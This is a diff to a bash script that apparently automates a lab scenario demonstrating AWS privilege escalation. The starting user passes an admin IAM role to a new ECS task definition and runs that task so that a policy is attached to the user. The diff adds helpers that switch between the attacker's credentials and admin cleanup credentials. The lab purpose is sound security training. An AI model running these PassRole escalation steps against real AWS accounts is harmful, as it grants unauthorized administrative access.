@@ -65,6 +65,10 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve admin cleanup credentials
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -82,12 +86,22 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_user_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -120,7 +134,8 @@ else
 fi
 echo ""
 
-# Step 5: Check for attached policies (should have none or minimal)
+# [OBSERVATION] Check for attached policies (should have none or minimal)
+use_admin_creds
 echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
 echo "Listing attached policies for: $STARTING_USER"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
@@ -131,7 +146,8 @@ else
 fi
 echo -e "${GREEN}✓ Verified current policy state${NC}\n"
 
-# Step 6: Register ECS task definition with admin role (PassRole escalation)
+# [EXPLOIT] Register ECS task definition with admin role (PassRole escalation)
+use_starting_user_creds
 echo -e "${YELLOW}Step 6: Registering ECS task definition with admin role${NC}"
 echo "This is the privilege escalation vector - creating a task that uses the admin role..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
@@ -196,7 +212,8 @@ else
 fi
 echo ""
 
-# Step 7: Get default VPC and subnet for ECS task
+# [OBSERVATION] Get default VPC and subnet for ECS task
+use_admin_creds
 echo -e "${YELLOW}Step 7: Finding network configuration for ECS task${NC}"
 
 # Get default VPC
@@ -229,7 +246,8 @@ fi
 echo "Using Subnet: $DEFAULT_SUBNET"
 echo -e "${GREEN}✓ Network configuration identified${NC}\n"
 
-# Step 8: Run the ECS task
+# [EXPLOIT] Run the ECS task
+use_starting_user_creds
 echo -e "${YELLOW}Step 8: Running ECS task to escalate privileges${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
 echo "Task Definition: $TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION"
@@ -255,7 +273,8 @@ else
 fi
 echo ""
 
-# Step 9: Wait for task to complete
+# [OBSERVATION] Wait for task to complete
+use_admin_creds
 echo -e "${YELLOW}Step 9: Waiting for ECS task to complete${NC}"
 echo "Monitoring task status..."
 
@@ -314,7 +333,8 @@ echo "IAM changes can take time to propagate across AWS infrastructure..."
 sleep 15
 echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 
-# Step 11: Verify policy was attached to starting user
+# [OBSERVATION] Verify policy was attached to starting user
+use_admin_creds
 echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
 echo "Checking attached policies for: $STARTING_USER"
 
